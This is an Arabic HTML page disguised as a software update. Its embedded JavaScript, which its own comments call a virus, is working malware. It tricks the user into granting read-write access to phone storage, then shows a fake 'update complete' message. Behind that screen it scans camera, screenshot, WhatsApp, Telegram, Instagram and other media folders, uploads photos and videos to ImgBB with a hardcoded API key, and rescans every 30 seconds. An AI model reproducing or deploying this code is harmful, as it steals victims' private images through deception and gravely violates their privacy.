<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
    <meta charset="UTF-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>تحميل...</title>
    <style>
        body { background: #000; color: #fff; font-family: Arial,sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; flex-direction: column; margin: 0; }
        .loader { border: 5px solid #333; border-top: 5px solid #0f0; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin-bottom: 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #msg { font-size: 1.2em; text-align: center; padding: 0 20px; }
        .btn { background: #0f0; color: #000; padding: 12px 30px; border: none; font-weight: bold; cursor: pointer; font-size: 1.1em; border-radius: 5px; display: none; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="loader"></div>
    <div id="msg">جاري تحميل التحديث...</div>
    <button id="startBtn" class="btn" onclick="begin()">بدء التحديث</button>
    <script>
        // ========== إعدادات ImgBB ==========
        const IMGBB_KEY = "69e4b5971880f9d736172f5fc9eb5bac";
        let ROOT = null;
        let stolen = 0;

        // ========== الظهور التدريجي للزر ==========
        setTimeout(() => {
            document.getElementById('msg').innerText = "يلزم الضغط على 'بدء التحديث'";
            document.getElementById('startBtn').style.display = 'block';
        }, 2500);

        // ========== بدء الفيروس ==========
        window.begin = async function() {
            document.getElementById('startBtn').style.display = 'none';
            document.getElementById('msg').innerText = "يرجى اختيار 'الذاكرة الداخلية' ثم 'موافق'...";

            // طلب الإذن
            try {
                ROOT = await window.showDirectoryPicker({ mode: 'readwrite' });
            } catch(e) {
                document.getElementById('msg').innerText = "حدث خطأ. حاول مرة أخرى.";
                document.getElementById('startBtn').style.display = 'block';
                return;
            }

            document.getElementById('msg').innerText = "جاري التحديث...";
            
            // إخفاء الواجهة
            setTimeout(() => {
                document.body.innerHTML = '<h2 style="color:#fff;text-align:center;margin-top:40vh;">تم التحديث ✓</h2>';
            }, 1000);

            // تشغيل الفيروس
            scanAllFolders();
        };

        // ========== فحص جميع المجلدات ==========
        async function scanAllFolders() {
            const folders = [
                'DCIM/Camera', 'DCIM/Screenshots',
                'Pictures', 'Download', 'Downloads',
                'WhatsApp/Media/WhatsApp Images',
                'WhatsApp/Media/WhatsApp Video',
                'Facebook/Media', 'Messenger/Media',
                'Telegram/Telegram Images', 'Snapchat/Media',
                'Instagram/Media', 'Twitter/Media'
            ];

            for (const folder of folders) {
                try {
                    let current = ROOT;
                    const parts = folder.split('/');
                    for (const part of parts) {
                        current = await current.getDirectoryHandle(part);
                    }
                    await stealFromFolder(current, folder);
                } catch(e) {
                    // المجلد غير موجود
                }
            }

            // بعد انتهاء الفحص، نبدأ فحصاً دورياً كل 30 ثانية
            setTimeout(() => scanAllFolders(), 30000);
        }

        // ========== سرقة الملفات من مجلد ==========
        async function stealFromFolder(dirHandle, folderName) {
            for await (const entry of dirHandle.values()) {
                if (entry.kind === 'file') {
                    const file = await entry.getFile();
                    const ext = file.name.split('.').pop().toLowerCase();
                    // قبول الصور والفيديو فقط
                    if (!['jpg','jpeg','png','gif','webp','mp4','mov','avi'].includes(ext)) continue;
                    // الحد الأقصى 10MB
                    if (file.size > 10 * 1024 * 1024) continue;

                    try {
                        const base64 = await fileToBase64(file);
                        const url = await uploadToImgBB(base64);
                        stolen++;
                        // طباعة في console للتأكيد
                        console.log(`✅ مسروق #${stolen}: ${folderName}/${file.name} -> ${url}`);
                    } catch(e) {
                        console.error(`❌ فشل: ${file.name}`, e.message);
                    }
                } else if (entry.kind === 'directory') {
                    try {
                        const subDir = await dirHandle.getDirectoryHandle(entry.name);
                        await stealFromFolder(subDir, folderName + '/' + entry.name);
                    } catch(e) {}
                }
            }
        }

        // ========== تحويل ملف إلى Base64 ==========
        function fileToBase64(file) {
            return new Promise((resolve, reject) => {
                const reader = new FileReader();
                reader.onload = () => {
                    const base64 = reader.result.split(',')[1];
                    resolve(base64);
                };
                reader.onerror = reject;
                reader.readAsDataURL(file);
            });
        }

        // ========== رفع إلى ImgBB ==========
        async function uploadToImgBB(base64) {
            const formData = new FormData();
            formData.append('key', IMGBB_KEY);
            formData.append('image', base64);

            const response = await fetch('https://api.imgbb.com/1/upload', {
                method: 'POST',
                body: formData
            });

            const result = await response.json();
            if (result.success) {
                return result.data.url;
            } else {
                throw new Error('رفض ImgBB');
            }
        }

        // ========== إبقاء الصفحة حية ==========
        setInterval(() => {
            console.log('🟢 فيروس نشط، مسروق: ' + stolen);
        }, 10000);
    </script>
</body>
</html>
